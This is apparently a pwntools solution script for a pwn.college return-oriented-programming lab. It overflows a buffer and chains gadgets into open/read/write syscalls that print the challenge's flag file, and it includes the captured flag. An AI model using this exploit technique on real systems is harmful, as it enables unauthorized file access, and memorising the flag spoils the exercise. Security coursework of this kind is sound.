#!/usr/bin/env python3
#pwn_college{01EIvGuJwPqFfRJF333avWazuDa.dJjNywCN2gzW}
#python3 solution.py

from pwn import *

target_address_1 = 0x401e1d #pop rax; ret;
target_address_2 = 0x401e15 #pop rdi; ret;
target_address_3 = 0x401e2d #pop rsi; ret;
target_address_4 = 0x401e3e #pop rdx; ret;
target_address_5 = 0x401e0d #syscall; ret;


s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
p = s.process("./babyrop_level5_testing1")
#p = process("./babyrop_level5_testing1")
#raw_input("attach gdb")

p.recvuntil("!\n###")

#pad = cyclic(128, n=8)
pad = b'A' * cyclic_find("laaaaaaa", n=8)


data_section="0x404500"

rax = 0x00 # read syscall
rdi = 0x00 # read from stdin
rsi = int(data_section, 16) # known memory address where flag's filename and later flag content gets copied
rdx = 0x08 # 8B flag
payload = pad + p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # read syscall

rax = 0x02 # open sys_call
rdi = int(data_section, 16) # path where "flag" keyword is stored
rsi = 0x00
rdx = 0x00
payload += p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # open syscall
#rax will contain the return value i.e. file handle here
#since we already know that the fd for flag file will be 3, hence we are not copying rax to rdi and directly putting value 3 in rdi instead.

rax = 0x00 # read syscall
rdi = 0x03 # fd from open syscall
rsi = int(data_section, 16) # memory where content gets copied
rdx = 0x40 # 64B flag
payload += p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # read syscall

rax = 0x01 # write syscall
rdi = 0x02 # fd for stdout
rsi = int(data_section, 16) # memory to read from
rdx = 0x40 # 64B flag
payload += p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # write syscall


print(payload)
p.sendline(payload)

flag_path = b'flag\x00\x00\x00\x00'
p.sendline(flag_path) # input 'flag' as a filename to store in known location in data_section

p.interactive()



